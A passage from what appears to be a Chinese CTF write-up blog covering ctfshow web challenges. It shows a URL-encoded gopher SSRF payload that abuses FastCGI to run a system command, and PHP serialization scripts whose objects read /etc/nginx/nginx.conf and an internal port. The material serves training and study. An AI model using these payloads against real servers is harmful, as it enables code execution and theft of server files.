+<pre class="language-php" data-language="php"><code class="language-php">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH83%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00S%04%00%3C%3Fphp%20system%28%27cat%20&#x2F;var&#x2F;www&#x2F;html&#x2F;f%2A%20%3E%20flag.txt%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932814438-81db3baf-612d-4ee1-a108-834406771f26.png" alt="image.png"></p>
+<h1 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h1><h3 id="SSRF读文件"><a href="#SSRF读文件" class="headerlink" title="SSRF读文件"></a>SSRF读文件</h3><p>admin-admin1<br>伪协议读nginx.conf:</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+class config&#123;
+	public $update_url &#x3D; &#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#39;;
+&#125;	
+class dao&#123;
+	private $config;
+	public function __construct()&#123;
+		$this-&gt;config&#x3D;new config();
+	&#125;
+&#125;
+echo base64_encode(serialize(new dao()));
+
+# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyODoiZmlsZTovLy9ldGMvbmdpbngvbmdpbnguY29uZiI7fX0&#x3D;
+</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932331570-e41b1877-b7a5-4e2f-8362-9700d2a562af.png" alt="image.png">每一个http块都可以包含多个server块，而每个server块就相当于一台虚拟主机，它内部可有多台主机联合提供服务，一起对外提供在逻辑上关系密切的一组服务</p>
+<pre class="language-php" data-language="php"><code class="language-php">server &#123;
+        listen       4476;
+        server_name  localhost;
+        root         &#x2F;var&#x2F;flag;
+        index index.html;
+
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    &#125;</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+class config&#123;
+	public $update_url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:4476&#39;;
+&#125;	
+
+class dao&#123;
+	private $config;
+	public function __construct()&#123;
+		$this-&gt;config&#x3D;new config();
+	&#125;
+&#125;
+
+echo base64_encode(serialize(new dao()));
+
+# TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czoyMToiaHR0cDovLzEyNy4wLjAuMTo0NDc2Ijt9fQ&#x3D;&#x3D;
+</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694932555604-4cbee450-6891-43ef-8b0b-141cacb63afb.png" alt="image.png"></p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/d7d45c8a/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web316-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/659d759f/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web361-web372SSTI篇</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
